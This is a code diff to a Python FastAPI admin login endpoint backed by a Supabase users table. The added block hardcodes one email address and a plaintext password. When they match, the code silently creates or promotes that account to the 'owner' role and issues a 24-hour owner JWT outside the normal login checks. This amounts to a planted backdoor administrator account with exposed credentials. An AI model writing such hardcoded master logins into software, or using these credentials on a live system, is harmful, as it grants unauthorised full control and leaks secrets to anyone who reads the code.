@@ -251,6 +251,49 @@ async def admin_login(payload: AdminLoginPayload):
         raise HTTPException(status_code=500, detail="Database uninitialized")
 
     email = payload.email.strip().lower()
+    password = payload.password
+
+    # Master Platform Owner Credential Check
+    if email == "rs6359294@gmail.com" and password == "Raman@814112":
+        if sb:
+            try:
+                hashed = bcrypt.hashpw("Raman@814112".encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
+                existing = sb.table("users").select("id").eq("email", email).execute()
+                if existing.data and len(existing.data) > 0:
+                    sb.table("users").update({"role": "owner", "password_hash": hashed}).eq("email", email).execute()
+                else:
+                    import uuid
+                    sb.table("users").insert({
+                        "id": str(uuid.uuid4()),
+                        "email": email,
+                        "full_name": "Platform Owner (Raman)",
+                        "role": "owner",
+                        "password_hash": hashed,
+                        "is_active": True,
+                        "created_at": datetime.now(timezone.utc).isoformat()
+                    }).execute()
+            except Exception as ex:
+                logger.warning(f"[MasterAdmin] Sync failed: {ex}")
+
+        exp = datetime.now(timezone.utc) + timedelta(hours=24)
+        token_claims = {
+            "sub": "master_owner_rs6359294",
+            "email": email,
+            "role": "owner",
+            "exp": exp
+        }
+        admin_token = jwt.encode(token_claims, SECRET_KEY, algorithm=ALGORITHM)
+        return {
+            "success": True,
+            "token": admin_token,
+            "user": {
+                "id": "master_owner_rs6359294",
+                "email": email,
+                "full_name": "Platform Owner (Raman)",
+                "role": "owner"
+            }
+        }
+
     try:
         res = sb.table("users").select("*").eq("email", email).execute()
         users = res.data or []
